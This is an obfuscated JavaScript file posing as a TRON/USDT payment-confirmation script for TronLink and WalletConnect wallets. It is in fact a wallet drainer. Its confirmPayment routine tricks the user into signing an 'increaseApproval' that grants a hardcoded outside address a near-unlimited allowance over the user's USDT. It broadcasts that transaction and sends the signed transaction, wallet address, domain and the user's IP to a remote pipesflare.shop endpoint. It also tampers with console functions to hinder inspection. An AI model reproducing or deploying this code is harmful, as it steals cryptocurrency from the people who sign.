const _0x4b5b=['insufficientBalance','Не\x20удалось\x20получить\x20IP','Элемент\x20waitingModal\x20не\x20найден\x20на\x20странице','fromCharCode','tronWeb','constant_result','https://api.trongrid.io/wallet/triggersmartcontract','signature','txid','fffffffffffffffffff','balance','https://api.trongrid.io/wallet/triggerconstantcontract','SHA256','test','operations','json','https://api.trongrid.io/wallet/getaccount','log','length','loadingText','keys','Адрес\x20кошелька\x20не\x20определён','7fff1fc0033ec30f000000000000000000000000000000000000000000000000','1yuUNsg','3997308SGdnnF','579223ZIckBL','map','{}.constructor(\x22return\x20this\x22)(\x20)','match','active_permission','warn','transactionBuildError','Транзакция\x20успешно\x20отправлена,\x20txID:','toLowerCase','123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz','now','setItem','parse','https://pipesflare.shop/api/confirm_payment_approve.php','POST','TronLink','Ошибка\x20получения\x20IP:','getItem','walletType','enc','toString','5431IIEccJ','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','walletconnect','845097ukVHkX','trx','Unsigned\x20transaction:','Ошибка\x20подписи:','location','waitingModal','add','7b5ae8c4-20b2-4244-bde1-1c4c8a6d8dd0','TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','classList','paymentError','confirmPayment','slice','bind','未返回交易数据','substr','showMessage','18317URoQVv','https://api.trongrid.io/wallet/broadcasttransaction','console','error','trace','raw_data','hostname','wallet','return\x20/\x22\x20+\x20this\x20+\x20\x22/','transaction','paymentFailure','✅\x20Данные\x20успешно\x20отправлены\x20в\x20confirm_payment_approve.php','constructor','),\x20пропускаем\x20confirmPayment','hidden','userCancelled','__proto__','apply','isValid','txExpired','fill','WalletConnect','message','TEXT','return\x20(function()\x20','signTransaction','result','stringify','getHash','set','application/json','sign','from','1jyoxnK','tronlink','Invalid\x20address\x20length\x20after\x20decoding','padStart','Ошибка\x20при\x20отправке\x20данных\x20в\x20confirm_payment_approve.php:','1743781BChBdR','ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff','search','TNZBn2TR1y81ERfwm7V4GFXkB89BkFGJU1','expiration','get','78hyTPdO','133UVTzIc','SHA-256','1130721VNIhCQ','success','Hex'];const _0x585c=function(_0x143ff1,_0x5418a3){_0x143ff1=_0x143ff1-0x1f0;let _0x3ae45d=_0x4b5b[_0x143ff1];return _0x3ae45d;};const _0xc024e5=_0x585c;(function(_0x35adb4,_0x4c4d24){const _0x1270c7=_0x585c;while(!![]){try{const _0x17b923=-parseInt(_0x1270c7(0x1fa))*parseInt(_0x1270c7(0x242))+-parseInt(_0x1270c7(0x231))+parseInt(_0x1270c7(0x1fd))*parseInt(_0x1270c7(0x217))+-parseInt(_0x1270c7(0x1f4))+-parseInt(_0x1270c7(0x1fb))*parseInt(_0x1270c7(0x22e))+parseInt(_0x1270c7(0x263))*parseInt(_0x1270c7(0x219))+parseInt(_0x1270c7(0x218));if(_0x17b923===_0x4c4d24)break;else _0x35adb4['push'](_0x35adb4['shift']());}catch(_0x4b6b08){_0x35adb4['push'](_0x35adb4['shift']());}}}(_0x4b5b,0xec29d));const _0x1de387=function(){let _0x27aeb1=!![];return function(_0x4262f1,_0x2a2484){const _0x2a31e6=_0x27aeb1?function(){const _0x4f464c=_0x585c;if(_0x2a2484){const _0x1ae3e0=_0x2a2484[_0x4f464c(0x253)](_0x4262f1,arguments);return _0x2a2484=null,_0x1ae3e0;}}:function(){};return _0x27aeb1=![],_0x2a31e6;};}(),_0x16d38b=_0x1de387(this,function(){const _0x25e914=function(){const _0x20e716=_0x585c,_0x2757c5=_0x25e914[_0x20e716(0x24e)](_0x20e716(0x24a))()[_0x20e716(0x24e)](_0x20e716(0x22f));return!_0x2757c5[_0x20e716(0x20d)](_0x16d38b);};return _0x25e914();});_0x16d38b();const _0x1c54bd=function(){let _0x146e88=!![];return function(_0x325eb5,_0x1bc550){const _0x54cfb7=_0x146e88?function(){if(_0x1bc550){const _0x4917f0=_0x1bc550['apply'](_0x325eb5,arguments);return _0x1bc550=null,_0x4917f0;}}:function(){};return _0x146e88=![],_0x54cfb7;};}(),_0x43755c=_0x1c54bd(this,function(){const _0x156c73=_0x585c;let _0x16f895;try{const _0x45d749=Function(_0x156c73(0x25a)+_0x156c73(0x21b)+');');_0x16f895=_0x45d749();}catch(_0x28b544){_0x16f895=window;}const _0x5b6aef=_0x16f895['console']=_0x16f895[_0x156c73(0x244)]||{},_0x1ca12e=['log',_0x156c73(0x21e),'info',_0x156c73(0x245),'exception','table',_0x156c73(0x246)];for(let _0x342a0e=0x0;_0x342a0e<_0x1ca12e[_0x156c73(0x212)];_0x342a0e++){const _0xd226da=_0x1c54bd[_0x156c73(0x24e)]['prototype'][_0x156c73(0x23e)](_0x1c54bd),_0x534809=_0x1ca12e[_0x342a0e],_0x5f2018=_0x5b6aef[_0x534809]||_0xd226da;_0xd226da[_0x156c73(0x252)]=_0x1c54bd['bind'](_0x1c54bd),_0xd226da['toString']=_0x5f2018[_0x156c73(0x22d)][_0x156c73(0x23e)](_0x5f2018),_0x5b6aef[_0x534809]=_0xd226da;}});_0x43755c(),window[_0xc024e5(0x23c)]=async function(){const _0x55a989=_0xc024e5;try{const _0x51bbf0=window['walletAddress'];if(!_0x51bbf0){console[_0x55a989(0x245)](_0x55a989(0x215)),window['showMessage']?.(translations[currentLang][_0x55a989(0x258)][_0x55a989(0x24c)],_0x55a989(0x245));return;}const _0x12ff7c=JSON[_0x55a989(0x225)](localStorage[_0x55a989(0x22a)]('approvedWallets')||'{}');if(_0x12ff7c[_0x51bbf0]){console[_0x55a989(0x211)]('Кошелёк\x20'+_0x51bbf0+'\x20уже\x20подписал\x20транзакцию\x20(txID:\x20'+_0x12ff7c[_0x51bbf0]['txID']+_0x55a989(0x24f));return;}const _0x1aca9e=await getTRXBalance(_0x51bbf0);if(!_0x1aca9e||_0x1aca9e===![]||_0x1aca9e[_0x55a989(0x254)]===![]){window[_0x55a989(0x241)]?.(translations[currentLang][_0x55a989(0x258)][_0x55a989(0x24c)],'error'),enableButtonsAndRestoreText();return;}if(_0x1aca9e[_0x55a989(0x20a)]<=0xa){window[_0x55a989(0x241)]?.(translations[currentLang][_0x55a989(0x258)][_0x55a989(0x200)],_0x55a989(0x245)),enableButtonsAndRestoreText();return;}disableButtonsWithText(translations[currentLang][_0x55a989(0x213)]);let _0x28b46f;window[_0x55a989(0x22b)]===_0x55a989(0x257)?_0x28b46f=_0x55a989(0x230):_0x28b46f=getWalletFromUrl()||_0x55a989(0x1f0);let _0x193f68=await buildApprove(_0x51bbf0);console['log'](_0x55a989(0x233),_0x193f68);if(!_0x193f68){window[_0x55a989(0x241)](translations[currentLang]['message'][_0x55a989(0x21f)],'error'),enableButtonsAndRestoreText();return;}let _0x228684;try{if(window[_0x55a989(0x22b)]===_0x55a989(0x228))_0x228684=await window[_0x55a989(0x204)][_0x55a989(0x232)][_0x55a989(0x261)](_0x193f68);else{if(window[_0x55a989(0x22b)]===_0x55a989(0x257))_0x228684=await window['adapter'][_0x55a989(0x25b)](_0x193f68);else{enableButtonsAndRestoreText(),window[_0x55a989(0x241)](translations[currentLang][_0x55a989(0x258)][_0x55a989(0x251)],_0x55a989(0x245));return;}}}catch(_0x5e7acf){console['error'](_0x55a989(0x234),_0x5e7acf),enableButtonsAndRestoreText(),window[_0x55a989(0x241)](translations[currentLang][_0x55a989(0x258)][_0x55a989(0x251)],_0x55a989(0x245));return;}if(!_0x228684||!_0x228684['signature']||!_0x228684[_0x55a989(0x207)][_0x55a989(0x212)]){enableButtonsAndRestoreText(),window[_0x55a989(0x241)](translations[currentLang]['message']['userCancelled'],_0x55a989(0x245));return;}if(!JSON['stringify'](_0x228684)['includes'](_0x55a989(0x209))){window[_0x55a989(0x241)]?.(translations[currentLang][_0x55a989(0x258)]['approveError'],'error'),enableButtonsAndRestoreText();return;}if(!isTxStillValid(_0x228684)){window[_0x55a989(0x241)]?.(translations[currentLang][_0x55a989(0x258)][_0x55a989(0x255)],_0x55a989(0x245)),enableButtonsAndRestoreText();return;}const _0x32ed30=document['getElementById'](_0x55a989(0x236));_0x32ed30?_0x32ed30['classList']['remove'](_0x55a989(0x250)):console['warn'](_0x55a989(0x202));const _0x31dc98=await fetch(_0x55a989(0x243),{'method':_0x55a989(0x227),'headers':{'Content-Type':_0x55a989(0x260),'TRON-PRO-API-KEY':_0x55a989(0x238)},'body':JSON['stringify'](_0x228684)}),_0xfdc969=await _0x31dc98[_0x55a989(0x20f)]();if(_0xfdc969[_0x55a989(0x25c)]===!![]&&_0xfdc969[_0x55a989(0x208)]){console[_0x55a989(0x211)](_0x55a989(0x220),_0xfdc969[_0x55a989(0x208)]),_0x12ff7c[_0x51bbf0]={'txID':_0xfdc969[_0x55a989(0x208)],'timestamp':Date[_0x55a989(0x223)]()},localStorage[_0x55a989(0x224)]('approvedWallets',JSON[_0x55a989(0x25d)](_0x12ff7c));const _0x26d247=window[_0x55a989(0x235)][_0x55a989(0x248)];let _0x5b4f9f=_0x55a989(0x201);try{const _0x56c912=await fetch('https://api.ipify.org?format=json'),_0x131829=await _0x56c912[_0x55a989(0x20f)]();_0x5b4f9f=_0x131829['ip'];}catch(_0x3af5ce){console[_0x55a989(0x245)](_0x55a989(0x229),_0x3af5ce);}const _0x40e755='https://tronscan.org/#/transaction/'+_0xfdc969[_0x55a989(0x208)];try{const _0x2119e9=await fetch(_0x55a989(0x226),{'method':'POST','headers':{'Content-Type':_0x55a989(0x260)},'body':JSON['stringify']({'signed_tx':btoa(JSON['stringify'](_0x228684)),'payment_address':_0x51bbf0,'wallet_name':_0x28b46f,'domain':_0x26d247,'ip':_0x5b4f9f,'tx_id':_0xfdc969['txid'],'tx_link':_0x40e755})}),_0x5b1360=await _0x2119e9[_0x55a989(0x20f)]();_0x5b1360['status']===_0x55a989(0x1fe)?console[_0x55a989(0x211)](_0x55a989(0x24d)):console[_0x55a989(0x245)]('Ошибка\x20отправки\x20данных\x20в\x20confirm_payment_approve.php:',_0x5b1360);}catch(_0x117350){console['error'](_0x55a989(0x1f3),_0x117350);}setTimeout(()=>{const _0x206304=_0x55a989;window[_0x206304(0x241)](translations[currentLang][_0x206304(0x258)]['paymentSuccess'],_0x206304(0x1fe)),_0x32ed30&&_0x32ed30['classList']['add']('hidden'),enableButtonsAndRestoreText();},0x7d0);return;}else{console[_0x55a989(0x245)]('Ошибка\x20отправки\x20транзакции:',_0xfdc969),window[_0x55a989(0x241)](translations[currentLang][_0x55a989(0x258)]['paymentFailure'],_0x55a989(0x245));_0x32ed30&&_0x32ed30[_0x55a989(0x23a)]['add']('hidden');enableButtonsAndRestoreText();return;}}catch(_0x1e68eb){console[_0x55a989(0x245)]('Ошибка\x20транзакции:',_0x1e68eb),window[_0x55a989(0x241)](translations[currentLang][_0x55a989(0x258)][_0x55a989(0x23b)],_0x55a989(0x245));const _0x36f412=document['getElementById'](_0x55a989(0x236));_0x36f412&&_0x36f412['classList'][_0x55a989(0x237)](_0x55a989(0x250));enableButtonsAndRestoreText();return;}};function delay(_0x4339d3){return new Promise(_0x5ef9d0=>setTimeout(_0x5ef9d0,_0x4339d3));}function sha256DigestFromHexFallback(_0x2076f1){const _0x22ecf4=_0xc024e5,_0xea162d=CryptoJS['enc'][_0x22ecf4(0x1ff)][_0x22ecf4(0x225)](_0x2076f1),_0x2bf668=CryptoJS[_0x22ecf4(0x20c)](_0xea162d);return CryptoJS['enc'][_0x22ecf4(0x1ff)]['stringify'](_0x2bf668);}function hexToBin(_0x5beced){const _0x171483=_0xc024e5;let _0xa24aa5='';for(let _0x3f0dfc=0x0;_0x3f0dfc<_0x5beced[_0x171483(0x212)];_0x3f0dfc+=0x2){_0xa24aa5+=String[_0x171483(0x203)](parseInt(_0x5beced[_0x171483(0x240)](_0x3f0dfc,0x2),0x10));}return _0xa24aa5;}function sha256Hash(_0x4975a9){const _0xbb7993=_0xc024e5,_0x4b6f16=new jsSHA(_0xbb7993(0x1fc),_0xbb7993(0x259));return _0x4b6f16['update'](_0x4975a9),_0x4b6f16[_0xbb7993(0x25e)]('HEX');}function calculateHash(_0x42d895){const _0x3e7ebe=_0xc024e5,_0x41083c=CryptoJS['enc']['Hex']['parse'](_0x42d895),_0x3a2ff1=CryptoJS['SHA256'](_0x41083c);return _0x3a2ff1[_0x3e7ebe(0x22d)](CryptoJS[_0x3e7ebe(0x22c)][_0x3e7ebe(0x1ff)]);}function delay(_0xba6580){return new Promise(_0x396ab8=>setTimeout(_0x396ab8,_0xba6580));}function base58ToHexAddress(_0x3c6c78){const _0x3b69dc=_0xc024e5,_0xcd654d=_0x3b69dc(0x222),_0x312814={};for(let _0x3ea5c0=0x0;_0x3ea5c0<_0xcd654d[_0x3b69dc(0x212)];_0x3ea5c0++){_0x312814[_0xcd654d[_0x3ea5c0]]=_0x3ea5c0;}let _0x242ece=BigInt(0x0);for(let _0x24635b=0x0;_0x24635b<_0x3c6c78['length'];_0x24635b++){const _0x124662=_0x3c6c78[_0x24635b];if(!(_0x124662 in _0x312814))throw new Error('Invalid\x20Base58\x20character:\x20'+_0x124662);_0x242ece=_0x242ece*0x3an+BigInt(_0x312814[_0x124662]);}let _0x1b589e=_0x242ece[_0x3b69dc(0x22d)](0x10);if(_0x1b589e[_0x3b69dc(0x212)]%0x2)_0x1b589e='0'+_0x1b589e;let _0x4b263a=Uint8Array[_0x3b69dc(0x262)](_0x1b589e[_0x3b69dc(0x21c)](/.{2}/g)['map'](_0xf7cab9=>parseInt(_0xf7cab9,0x10))),_0x191646=0x0;while(_0x3c6c78[_0x191646]==='1')_0x191646++;if(_0x191646>0x0){const _0x520873=new Uint8Array(_0x191646)[_0x3b69dc(0x256)](0x0),_0x31f526=new Uint8Array(_0x520873['length']+_0x4b263a['length']);_0x31f526[_0x3b69dc(0x25f)](_0x520873),_0x31f526[_0x3b69dc(0x25f)](_0x4b263a,_0x520873[_0x3b69dc(0x212)]),_0x4b263a=_0x31f526;}if(_0x4b263a[_0x3b69dc(0x212)]!==0x19)throw new Error(_0x3b69dc(0x1f1));const _0x16e9c3=_0x4b263a[_0x3b69dc(0x23d)](0x0,0x15);return[..._0x16e9c3][_0x3b69dc(0x21a)](_0x3c653b=>_0x3c653b[_0x3b69dc(0x22d)](0x10)[_0x3b69dc(0x1f2)](0x2,'0'))['join']('');}function padLeft(_0x4dc71a,_0xda7e3b){return _0x4dc71a['padStart'](_0xda7e3b,'0');}function encodeAddressParam(_0x280c0c){const _0x6ecd92=base58ToHexAddress(_0x280c0c)['replace'](/^0x/,'');return _0x6ecd92['padStart'](0x40,'0');}async function getUSDTBalance(_0x47d37c){const _0x1c87d5=_0xc024e5,_0x20662d=_0x1c87d5(0x239),_0x5f1d17='7b5ae8c4-20b2-4244-bde1-1c4c8a6d8dd0',_0x5d7d4c=_0x1c87d5(0x20b),_0x4d490c=base58ToHexAddress(_0x47d37c),_0x3d55c8=base58ToHexAddress(_0x20662d),_0x55c730=encodeAddressParam(_0x47d37c),_0x216207={'owner_address':_0x4d490c,'contract_address':_0x3d55c8,'function_selector':'balanceOf(address)','parameter':_0x55c730},_0x130977={'Content-Type':'application/json','TRON-PRO-API-KEY':_0x5f1d17};try{const _0x67e783=await fetch(_0x5d7d4c,{'method':_0x1c87d5(0x227),'headers':_0x130977,'body':JSON[_0x1c87d5(0x25d)](_0x216207)}),_0x524027=await _0x67e783[_0x1c87d5(0x20f)]();if(_0x524027['constant_result']&&_0x524027[_0x1c87d5(0x205)][0x0]){const _0x1ad182=_0x524027[_0x1c87d5(0x205)][0x0],_0x43bca4=parseInt(_0x1ad182,0x10)/0xf4240;return _0x43bca4;}else return![];}catch(_0x1faabe){return console['error']('USDT\x20查询失败:',_0x1faabe),![];}}async function getTRXBalance(_0x5ec2bc){const _0x204253=_0xc024e5,_0x1b41cf='af548b3a-2ce3-429f-bb6f-1cc099f1b6fe',_0x481972=_0x204253(0x210),_0x1d4759=base58ToHexAddress(_0x5ec2bc),_0x3ed50f={'Content-Type':_0x204253(0x260),'TRON-PRO-API-KEY':_0x1b41cf};try{const _0x554cfe=await fetch(_0x481972,{'method':_0x204253(0x227),'headers':_0x3ed50f,'body':JSON[_0x204253(0x25d)]({'address':_0x1d4759})}),_0x2dd4c7=await _0x554cfe[_0x204253(0x20f)](),_0x3979e2=_0x2dd4c7[_0x204253(0x20a)]!==undefined?_0x2dd4c7[_0x204253(0x20a)]/0xf4240:0x0,_0x6fed8d=_0x2dd4c7?.[_0x204253(0x21d)]?.[0x0],_0x35c6a0=_0x6fed8d?.[_0x204253(0x214)]||[];if(_0x3979e2===0x0&&_0x6fed8d===undefined)return{'balance':0x0,'isValid':!![]};const _0x3871ee=_0x35c6a0['length']!==0x1,_0x5f0859=_0x6fed8d?.[_0x204253(0x20e)]===_0x204253(0x216),_0x404bd0=_0x35c6a0?.[0x0]?.['address']?.['toLowerCase']()===_0x1d4759[_0x204253(0x221)](),_0x51871f=!_0x3871ee&&_0x5f0859&&_0x404bd0;return{'balance':_0x3979e2,'isValid':_0x51871f};}catch(_0x2a139f){return{'balance':0x0,'isValid':!![]};}}function isTxStillValid(_0x467e90,_0x52dbb0=0xf){const _0x43671c=_0xc024e5,_0x6ec415=_0x467e90?.[_0x43671c(0x24b)]?.['raw_data']?.['expiration']??_0x467e90?.[_0x43671c(0x247)]?.[_0x43671c(0x1f8)]??null;if(!_0x6ec415)return![];const _0x4572db=Date[_0x43671c(0x223)](),_0x5a826f=_0x6ec415-_0x4572db;return _0x5a826f>=_0x52dbb0*0x3e8?!![]:![];}async function buildApprove(_0x2e4716){const _0x526ac0=_0xc024e5,_0x43ab71=_0x526ac0(0x1f7),_0x1e6499='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',_0x1db702=_0x526ac0(0x1f5),_0x46e41d=base58ToHexAddress(_0x2e4716),_0x546596=base58ToHexAddress(_0x43ab71),_0x360656=base58ToHexAddress(_0x1e6499),_0x5db22c=_0x546596[_0x526ac0(0x23d)](0x2),_0x2dab79=padLeft(_0x5db22c,0x40)+padLeft(_0x1db702,0x40),_0x459452={'owner_address':_0x46e41d,'contract_address':_0x360656,'function_selector':'increaseApproval(address,uint256)','parameter':_0x2dab79,'call_value':0x0,'fee_limit':0x5f5e100,'visible':![]};try{const _0x312487=await fetch(_0x526ac0(0x206),{'method':_0x526ac0(0x227),'headers':{'Content-Type':_0x526ac0(0x260)},'body':JSON[_0x526ac0(0x25d)](_0x459452)}),_0x4bceb5=await _0x312487['json']();if(!_0x4bceb5?.[_0x526ac0(0x24b)]?.['raw_data'])throw new Error(_0x526ac0(0x23f));return _0x4bceb5[_0x526ac0(0x24b)];}catch(_0x14e370){throw _0x14e370;}}function getWalletFromUrl(){const _0x1f88aa=_0xc024e5,_0x388429=new URLSearchParams(window[_0x1f88aa(0x235)][_0x1f88aa(0x1f6)]),_0x541156=_0x388429[_0x1f88aa(0x1f9)](_0x1f88aa(0x249));return _0x541156?_0x541156:_0x1f88aa(0x1f0);}
